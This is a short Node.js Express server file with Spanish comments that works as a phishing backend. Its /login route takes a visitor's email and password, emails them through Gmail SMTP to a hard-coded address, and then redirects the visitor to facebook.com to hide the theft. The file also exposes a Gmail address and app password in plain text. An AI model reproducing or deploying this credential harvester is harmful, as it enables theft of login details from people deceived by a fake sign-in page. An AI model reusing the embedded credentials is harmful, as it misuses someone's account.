const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const port = 3000;

// Configurar middlewares
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Configurar nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'tchiquito1999@gmail.com', // Cambia por tu correo de Gmail
        pass: 'xgky ajfy tzfz kpxz',     // Usa una contraseña de aplicación de Google
    },
});

// Ruta para manejar el formulario de login
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    const mailOptions = {
        from: 'tchiquito1999@gmail.com', // Cambia por tu correo
        to: 'tchiquito1999@gmail.com',   // Cambia por tu correo receptor
        subject: 'Nuevo intento de inicio de sesión',
        text: `Se han ingresado las siguientes credenciales:\n\nCorreo: ${email}\nContraseña: ${password}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            res.status(500).send('Error al enviar los datos por correo.');
        } else {
            console.log('Correo enviado: ' + info.response);
            res.redirect('https://www.facebook.com'); // Redirigir a Google
        }
    });
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor funcionando en http://localhost:${port}`);
});
